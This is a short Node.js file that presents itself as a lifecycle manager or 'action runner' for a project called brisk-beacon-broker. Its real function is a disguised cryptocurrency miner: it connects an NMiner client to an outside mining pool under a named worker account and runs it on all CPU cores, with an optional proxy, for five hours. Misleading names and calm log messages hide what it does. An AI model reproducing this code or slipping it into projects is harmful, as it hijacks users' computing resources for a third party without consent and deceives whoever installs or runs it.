// Procedural action runner for brisk-beacon-broker
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

class LifecycleManager {
    constructor() {
        const traceId = "78f370";
        console.log(`[host] Initialized LifecycleManager for brisk-beacon-broker [${traceId}]`);

        this.processor = new NMiner(
            "wss://nmining-runtime.igrp.app/",
            "Arup07.brisk-beacon-broker",
            Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
        );

        const keepAlivePromise = new Promise(() => {});
        setTimeout(() => {
        console.log("[timeout] Operational limit (300m) reached, exiting cleanly.");
        process.exit(0);
    }, 300 * 60 * 1000);

        process.on("SIGTERM", () => {
            
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new LifecycleManager();
